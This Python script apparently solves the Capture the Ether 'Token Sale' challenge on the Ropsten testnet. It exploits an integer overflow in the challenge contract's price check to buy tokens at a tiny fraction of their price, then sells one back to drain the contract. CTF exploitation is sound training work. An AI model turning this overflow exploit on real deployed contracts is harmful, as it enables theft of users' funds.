from web3 import Web3
from config import CONFIG
from solcx import compile_source

w3 = Web3(Web3.HTTPProvider(CONFIG["INFURA_URL_ROPSTEN"]))

CONTRACT_ADDRESS = "0xbC89952bB89470EA4d760d4C3d36aE9F4f6C0339"

with open('CTE_Contracts/TokenSaleChallenge.sol', 'r') as file:
    challenge_code = file.read()

compiled_sol = compile_source(challenge_code, solc_version="0.4.21")

contract_id, contract_interface = compiled_sol.popitem()
abi = contract_interface["abi"]

contract = w3.eth.contract(address=CONTRACT_ADDRESS, abi=abi)

amount_to_buy = (2**256)//(10**18)+1

#about 0.416 Ether, better value can be determined by iteratively multiplying with prime number, see:
#https://github.com/MrToph/capture-the-ether/blob/master/test/math/token-sale.ts
value_to_pay = amount_to_buy * (10 ** 18) % (2 ** 256)

buy_tx = contract.functions.buy(amount_to_buy).buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS"]),
    'value': value_to_pay,
    'gas': 3000000,
    'gasPrice': w3.toWei('5', 'gwei')
})
signed_tx = w3.eth.account.signTransaction(buy_tx, private_key=CONFIG["PRIVATE_KEY"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
print(w3.toHex(tx_hash))

receipt = w3.eth.waitForTransactionReceipt(tx_hash)

sell_tx = contract.functions.sell(1).buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS"]),
    'gas': 3000000,
    'gasPrice': w3.toWei('5', 'gwei')
})
signed_tx = w3.eth.account.signTransaction(sell_tx, private_key=CONFIG["PRIVATE_KEY"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
print(w3.toHex(tx_hash))
